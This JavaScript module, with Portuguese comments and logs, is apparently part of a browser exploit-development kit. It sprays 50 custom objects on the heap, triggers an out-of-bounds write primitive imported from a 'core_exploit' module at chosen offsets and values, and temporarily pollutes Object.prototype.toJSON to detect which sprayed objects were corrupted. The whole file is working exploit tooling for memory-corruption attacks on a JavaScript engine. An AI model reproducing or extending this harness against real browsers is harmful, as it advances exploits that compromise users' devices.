// js/script3/testSprayComplexObjects_v2.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345; // Um número
        this.value2 = "initial_state"; // Uma string
        this.marker = 0xCAFECAFE; // Um marcador para verificar se a estrutura foi sobrescrita
    }

    checkIntegrity(loggerFunc = null) {
        let checkOk = true;
        const currentId = this.id || "ID_DESCONHECIDO";
        if (this.marker !== 0xCAFECAFE) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)} (esperado 0xCAFECAFE)`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        if (this.value1 !== 12345) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! value1: ${this.value1} (esperado 12345)`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        if (this.value2 !== "initial_state") {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! value2: "${this.value2}" (esperado "initial_state")`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        return checkOk;
    }

    action() {
        return `ID:${this.id}_Val1:${this.value1}_Marker:${toHex(this.marker)}`;
    }
}

// toJSON que sonda propriedades específicas de MyComplexObject
export function toJSON_ProbeMyComplexObjectSpecific() {
    const FNAME_toJSON = "toJSON_ProbeMyComplexObjectSpecific";
    let result_payload = {
        toJSON_executed: FNAME_toJSON,
        this_type: "N/A",
        is_instance_of_mycomplexobject: false,
        id_prop: "N/A",
        value1_prop: "N/A",
        value2_prop: "N/A",
        marker_prop: "N/A",
        integrity_check_result: "N/A",
        action_method_result: "N/A",
        error_in_toJSON: null
    };

    try {
        result_payload.this_type = Object.prototype.toString.call(this);
        result_payload.is_instance_of_mycomplexobject = this instanceof MyComplexObject;

        if (result_payload.is_instance_of_mycomplexobject) {
            try { result_payload.id_prop = String(this.id).substring(0,50); }
            catch (e) { result_payload.id_prop = `Error: ${e.name}`; }

            try { result_payload.value1_prop = this.value1; }
            catch (e) { result_payload.value1_prop = `Error: ${e.name}`; }

            try { result_payload.value2_prop = String(this.value2).substring(0,50); }
            catch (e) { result_payload.value2_prop = `Error: ${e.name}`; }

            try { result_payload.marker_prop = toHex(this.marker); }
            catch (e) { result_payload.marker_prop = `Error: ${e.name}`; }

            try {
                result_payload.integrity_check_result = this.checkIntegrity(logS3); // Passar logS3 para log interno
            } catch (e) {
                result_payload.integrity_check_result = `Error calling checkIntegrity: ${e.name}`;
            }
            try {
                result_payload.action_method_result = String(this.action()).substring(0,100);
            } catch (e) {
                result_payload.action_method_result = `Error calling action: ${e.name}`;
            }
        } else {
            result_payload.error_in_toJSON = "this is not an instance of MyComplexObject.";
        }

    } catch (e_main) {
        result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + ` GEN_ERR: ${e_main.name}: ${e_main.message}`;
    }
    return result_payload;
}

export async function executeSprayAndProbeWithCorruptionParams({
    corruption_offset,
    corruption_value,
    corruption_size,
    test_id_suffix
}) {
    const FNAME_TEST = `executeSprayAndProbe_Params<${test_id_suffix}>`;
    logS3(`--- Iniciando Teste Spray & Probe: Corrupção 0x${corruption_value.toString(16)} @0x${corruption_offset.toString(16)} (${corruption_size}B) ---`, "test", FNAME_TEST);
    document.title = `Spray&Probe ${test_id_suffix}`;

    const spray_count = 50; // Número de objetos a pulverizar
    const sprayed_objects = [];

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return { sprayError: e_spray, test_id_suffix };
    }

    await PAUSE_S3(200); // Pausa curta

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { oobError: new Error("OOB Setup Failed"), test_id_suffix };
    }

    try {
        logS3(`   Escrevendo ${isAdvancedInt64Object(corruption_value) ? corruption_value.toString(true) : toHex(corruption_value)} em oob_array_buffer_real[${toHex(corruption_offset)}] (${corruption_size} bytes)...`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset, corruption_value, corruption_size);
        logS3(`   Escrita OOB em oob_array_buffer_real realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { oobWriteError: e_write, test_id_suffix };
    }

    await PAUSE_S3(200); // Pausa curta

    logS3(`3. Sondando os primeiros ${Math.min(10, spray_count)} MyComplexObject(s) pulverizados...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let firstProblemFound = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ProbeMyComplexObjectSpecific,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10);
        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            document.title = `Sondando Obj ${i} - ${test_id_suffix}`;
            let stringifyResult = null;
            let errorDuringStringify = null;
            let initialIntegrityOK = obj.checkIntegrity(); // Checa integridade ANTES de stringify

            logS3(`   Testando objeto ${i} (ID: ${obj.id}, Integridade ANTES: ${initialIntegrityOK})...`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);

                if (stringifyResult && stringifyResult.error_in_toJSON) {
                    errorDuringStringify = new Error(`Erro interno da toJSON: ${stringifyResult.error_in_toJSON}`);
                } else if (stringifyResult && stringifyResult.integrity_check_result === false) {
                    errorDuringStringify = new Error(`Falha de integridade detectada PELA toJSON.`);
                } else if (stringifyResult && stringifyResult.action_method_result && String(stringifyResult.action_method_result).startsWith("Error")) {
                    errorDuringStringify = new Error(`Erro ao chamar método action: ${stringifyResult.action_method_result}`);
                }
            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            }

            if (!initialIntegrityOK || errorDuringStringify) {
                firstProblemFound = {
                    index: i,
                    id: obj.id,
                    initialIntegrityOK: initialIntegrityOK,
                    error: errorDuringStringify ? {name: errorDuringStringify.name, message: errorDuringStringify.message} : null,
                    toJSONReturn: stringifyResult,
                    test_id_suffix
                };
                document.title = `PROBLEM Obj ${i} - ${test_id_suffix}! (${errorDuringStringify ? errorDuringStringify.name : 'IntegrityFail'})`;
                break;
            }
            if (i < objectsToProbe -1) await PAUSE_S3(50); // Pequena pausa
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
        firstProblemFound = { error: {name: "MainLoopError", message: e_main_loop.message }, test_id_suffix};
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype.toJSON;
        }
    }

    if (firstProblemFound) {
        logS3(`PROBLEMA DETECTADO (${test_id_suffix}): Objeto index ${firstProblemFound.index} (ID: ${firstProblemFound.id})`, "critical", FNAME_TEST);
    } else {
        logS3(`Nenhum problema óbvio detectado nos primeiros objetos sondados (${test_id_suffix}).`, "good", FNAME_TEST);
    }

    logS3(`--- Teste Spray & Probe (${test_id_suffix}) CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    return firstProblemFound;
}
